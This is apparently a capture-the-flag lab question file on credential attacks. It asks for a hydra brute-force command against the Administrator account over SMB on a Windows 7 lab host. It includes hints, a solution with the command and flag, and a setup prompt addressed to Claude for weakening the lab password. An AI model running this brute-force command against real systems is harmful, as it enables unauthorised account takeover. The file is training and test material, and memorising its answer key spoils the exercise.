# Q098 — SMB Bruteforce Win7

| Field | Value |
|---|---|
| **Target** | `192.168.52.130` (Windows 7) |
| **Domain** | 05 — Credential Attacks |
| **Difficulty** | 🟡 Medium |
| **Tools** | `hydra` |
| **Time budget** | 10–20 min |

---

## 📝 Question

Use hydra against SMB on Win7 to brute Administrator. Provide command.

---

## 🎯 Flag Format

```
cmd=<short>
```

Example: `cmd=hydra -l Administrator -P pass.txt smb://192.168.52.130`

**⚠️ Format strict hai** — lowercase, no spaces around `=`, semicolon separator where shown.

---

## 💡 Hints

<details>
<summary>Hint 1 (click)</summary>

`smb` module.
</details>

<details>
<summary>Hint 2</summary>

Win7 lockout policy may apply.
</details>

---

## ✅ Solution

<details>
<summary>Show solution</summary>

```bash
hydra -l Administrator -P /usr/share/wordlists/fasttrack.txt smb://192.168.52.130
```

Cracks if password in list.

**Answer:** `cmd=hydra -l Administrator -P pass.txt smb://192.168.52.130`

📖 Ref: [tools/hydra.md](../../tools/hydra.md)
</details>

---

## 🤖 Claude Setup Prompt (for Claude-on-your-PC)

```
Pre-requisites for Q098:
1. Verify Win7 (192.168.52.130) up; SMB 445 open; Administrator account present.
2. Set Administrator password to something present in fasttrack.txt (e.g. 'password') for lab success.
3. fasttrack.txt present on Parrot.

Report back: "Lab ready for Q098 — Win7 SMB 445 open, Administrator pwd in wordlist".
```
